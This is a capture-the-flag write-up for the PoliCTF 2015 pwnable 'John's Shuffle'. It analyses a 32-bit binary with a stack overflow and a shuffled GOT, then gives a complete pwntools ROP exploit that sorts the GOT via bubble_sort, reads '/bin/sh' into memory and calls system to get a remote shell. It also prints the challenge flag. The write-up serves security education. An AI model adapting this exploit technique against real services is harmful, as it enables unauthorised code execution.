# PoliCTF 2015: John's Shuffle

**Category:** Pwnable
**Points:** 350
**Solves:** 55
**Description:**

> John is completely drunk and unable to protect his poor stack.. Fortunately he can still count on his terrific shuffling skills. Connect to
> shuffle.polictf.it:80

>> GPG key: PenOrmunonCerwivpagsyasOwirOjVed

> [johns-shuffle](johns-shuffle_ebee3fc8684b5802b681ade5dd06623f.tar.gz.gpg)

## Write-up
Runnning file on johns-shuffle:
>```bash
> $ file johns-shuffle
> johns-shuffle: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=8a7ccb88d6259fdf5b193f17dc4d8183ada66b64, not stripped
>```

Checksec:
>```bash
>gdb-peda$ checksec
>CANARY    : disabled
>FORTIFY   : disabled
>NX        : ENABLED
>PIE       : disabled
>RELRO     : Partial
>```

Looks like a 32-bit binary with NX and partial RELRO; this gives an idea of how to approach the exploit.

After tracing through my input, I found that it was being read in through an fgets call here:

>```assembly
> .text:08048F57 mov     dword ptr [esp+4], 44h ; n
> .text:08048F5F lea     eax, [esp+2Ch]
> .text:08048F63 mov     [esp], eax      ; s
> .text:08048F66 call    _fget
>```

The fgets function is being called with a size of 68, and after analyzing the size of the actual array in IDA, we can see that the size is 20 bytes. So after 20 bytes of input we achieve a stack based buffer overflow. Since the binary isn't compiled with a Canary we can simply overwrite the return address.

So next we look for ways to make the binary hit a return instruction. It seems like the main loop breaks when the call to exitcompare returns 1 or if seed\_2 is less than 0. The exitcompare function just seems to check if the first 4 bytes is exactly "exit" and returns 1 if they are. Seed\_2 initially is set to seed\_1 in the shuffle function and is decremented by half of seed_1 each loop. Seed\_1 is also initialized to the current time, which gives us 3 loops before the check fails. But really for all intents and purposes seed\_2 is really just a counter.

Looking at the list of imports, we see a lot of interesting functions such as system, read, write, execv, etc. 
_If you are looking at this in gdb, make sure to enable set follow-fork-mode parent since system(0) is called in shuffle._ So why not use read to write "/bin/sh\0" somewhere into the binary and call system! 

However, during runtime it seems that read@plt instead points to somewhere else:
>```assembly
>[----------------------------------registers-----------------------------------]
>EAX: 0x0 
>EBX: 0xb7784000 --> 0x1abda8 
>ECX: 0x4 
>EDX: 0xb763dee0 (<_IO_puts>:	push   ebp)
>ESI: 0x0 
>EDI: 0x0 
>EBP: 0x41414141 ('AAAA')
>ESP: 0xbff8f510 --> 0xa ('\n')
>EIP: 0x8048690 (<read@plt>:	jmp    DWORD PTR ds:0x804b00c)
>EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
>[-------------------------------------code-------------------------------------]
>   0x8048686:	jmp    DWORD PTR ds:0x804b008
>   0x804868c:	add    BYTE PTR [eax],al
>   0x804868e:	add    BYTE PTR [eax],al
>=> 0x8048690 <read@plt>:	jmp    DWORD PTR ds:0x804b00c
> | 0x8048696 <read@plt+6>:	push   0x0
> | 0x804869b <read@plt+11>:	jmp    0x8048680
> | 0x80486a0 <isnan@plt>:	jmp    DWORD PTR ds:0x804b010
> | 0x80486a6 <isnan@plt+6>:	push   0x8
> |->   0xb763dee0 <_IO_puts>:	push   ebp
>       0xb763dee1 <_IO_puts+1>:	push   edi
>       0xb763dee2 <_IO_puts+2>:	push   esi
>       0xb763dee3 <_IO_puts+3>:	push   ebx
>                                                                  JUMP is taken
>[------------------------------------stack-------------------------------------]
>0000| 0xbff8f510 --> 0xa ('\n')
>0004| 0xbff8f514 --> 0xbff8f5a4 --> 0xbff912e3 ("/home/ubuntu/johns-shuffle")
>0008| 0xbff8f518 --> 0xbff8f5ac --> 0xbff91312 ("XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0")
>0012| 0xbff8f51c --> 0xb77b0cea (<call_init+26>:	add    ebx,0x12316)
>0016| 0xbff8f520 --> 0x1 
>0020| 0xbff8f524 --> 0xbff8f5a4 --> 0xbff912e3 ("/home/ubuntu/johns-shuffle")
>0024| 0xbff8f528 --> 0xbff8f544 --> 0x7049d088 
>0028| 0xbff8f52c --> 0x804b040 --> 0xb75f1990 (<__libc_start_main>:	push   ebp)
>[------------------------------------------------------------------------------]
>Legend: code, data, rodata, value
>0x08048690 in read@plt ()
>gdb-peda$
>```

At first I had found it strange that the binary has no entries in the global offset table section, but it seems to be implementing its own. For those who don't know, the got and plt entries are what allows for binaries to be dynamically linked to external libraries. The shuffle and unshuffle functions then seem to be shifting around the got.plt entries which hold the resolved libc addresses. The shuffle is based on a random seed which is initialized in seed\_1 so each time the binary is run, the libc addresses will be in different areas. However srand is called again with seed\_1 each loop so that the same random number is used for each process.

There are a couple of ways to defeat this, 
1. Leak a libc address and jump to libc instead
2. Predict the pseudorandomness
3. Force the binary into a deterministic state

At first I tried to bruteforce a plt entry until it would be the write function and try to leak a libc address, but it didn't seem work out too well. In the end I realized that you could do #3, I saw the bubble\_sort function and figured that there is only one way that you can sort the got.plt entries and if you could do that, then you would know which plt entries matched up to where and it would be the same no matter how you shuffled it. I just analyzed which entries matched up to where and called those plt entries instead. Once the got.plt was sorted, the shuffle and unshuffle would just undo each other and at the end of the return the entries would stay sorted. Another problem I ended up having was that the I ran out of buffer room but I remedied this by chaning main so I could write more. 

So putting it all together:

>```python
>from pwn import *
>from struct import unpack
>
>context.log_level ="info"
>
>#r = remote('localhost',8888)
>r = remote('shuffle.polictf.it',80)
>padding = "A"*32
>padding2 = "A"*36
>padding3 = "A"*24
>
>bubsort = p32(0x0804891D)
>gotplt = p32(0x0804b00c)
>
>popret = p32(0x8048675)
>pop2ret = p32(0x804901e)
>pop3ret = p32(0x804901d)
>
>system_plt = p32(0x80486c0)
>read_plt = p32(0x8048750)
>
>main = p32(0x08048EBF)
>buff = p32(0x0804B070)
>
>r.send(padding+bubsort+pop2ret+gotplt+p32(25)+main+'\n') #sort the got.plt
>r.send('exit\n')
>
>r.send(padding2+read_plt+pop3ret+p32(0)+buff+p32(8)+main+'\n') #read /bin/sh into somewhere
>r.send('exit\n')
>
>pause(3) #wait for the read to go through
>r.send('/bin/sh\x00')
>
>r.send(padding3+system_plt+popret+buff+system_plt+popret+buff+'\n') #at this point the stack is pretty messed up so this line is pretty yolo
>r.send('exit\n')
>
>r.clean()
>r.interactive()
>```

_flag{rand0mizing_things_with_l0ve}_
## Other write-ups and resources

* none yet
